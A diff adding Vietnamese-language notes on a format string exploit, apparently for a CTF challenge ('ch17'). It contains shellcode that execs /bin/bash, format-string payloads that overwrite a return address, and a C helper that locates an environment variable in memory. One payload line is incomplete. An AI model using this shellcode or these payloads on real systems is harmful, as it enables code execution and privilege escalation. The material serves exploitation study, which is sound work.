@@ -1,0 +1,47 @@
+1) Mã shellcode được đặt trong một biến môi trường 
+2) Tràn, kiểm soát EIP, trỏ tới mã shell
+
+
+Bạn có thể chỉ định chiều rộng và điền vào khoảng trống 
+ở phía bên trái của phần còn thiếu: 
+
+sprintf (s, "% 8d% 8d", 123, 4567); 
+
+// kết quả: "123 4567"
+
+source : 
+	sprintf (buffer, "ERR Wrong user: %400s", user);
+        sprintf (outbuf, buffer);
+
+
+$ export SHELLCODE=`python -c 'print("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")'`
+
+$ (python -c 'print "%117x" + "\x0c\xfe\xff\xbf"' ; cat) | ./ch17
+
+-> Segmentation fault because gdb different 
+
+-------------------------------------------------------------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main(int argc, char * argv[]) {
+    char *ptr;
+    if(argc<3){
+        printf("Usage: %s <environment var> <target program name>\n", argv[0]);
+        exit(0);
+    }
+    ptr = getenv(argv[1]);
+    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;  
+    printf("%s will be at %p\n", argv[1], ptr);
+}
+// gcc findenv.c -o findenv
+------------------------------------------------------------------
+
+$ /tmp/findenv SHELLCODE ./ch17
+
+$ (python -c 'print "%117x"+"\x\x\xff\xbf"' ; cat ) | ./ch17
+
+
+link source: https://finsenty54.github.io/2021/01/03/Format_String_Bug_Basic_3/
+
+ 
